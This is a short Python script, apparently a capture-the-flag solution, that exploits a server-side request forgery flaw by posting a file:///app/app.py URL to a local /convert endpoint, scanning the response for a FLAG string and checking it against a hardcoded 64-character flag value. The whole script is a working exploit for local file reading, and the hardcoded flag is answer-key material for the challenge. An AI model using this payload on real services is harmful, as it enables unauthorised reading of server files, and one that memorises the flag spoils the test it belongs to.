import requests
import re

response = requests.post("http://127.0.0.1:32810/convert", data={'url': 'file:///app/app.py'}, stream=True)

print(f"Status: {response.status_code}")

# Read response in chunks
content = ""
for chunk in response.iter_content(chunk_size=8192, decode_unicode=True):
    if chunk:
        content += chunk
        # Stop if we found the flag
        if "FLAG{" in content:
            break

# Search for FLAG
flag_match = re.search(r'FLAG\{[a-fA-F0-9]{64}\}', content)

if flag_match:
    flag = flag_match.group(0)
    print(f"FLAG: {flag}")
    
    if flag == "FLAG{9a23b34477e5d66152607b8bf6cb296638ac520b70d4dd1f2f01326c6548a8c2}":
        print("VERIFIED: Correct flag")
        print("SSRF SUCCESS: Read /app/app.py via file://")
else:
    print("No FLAG found")

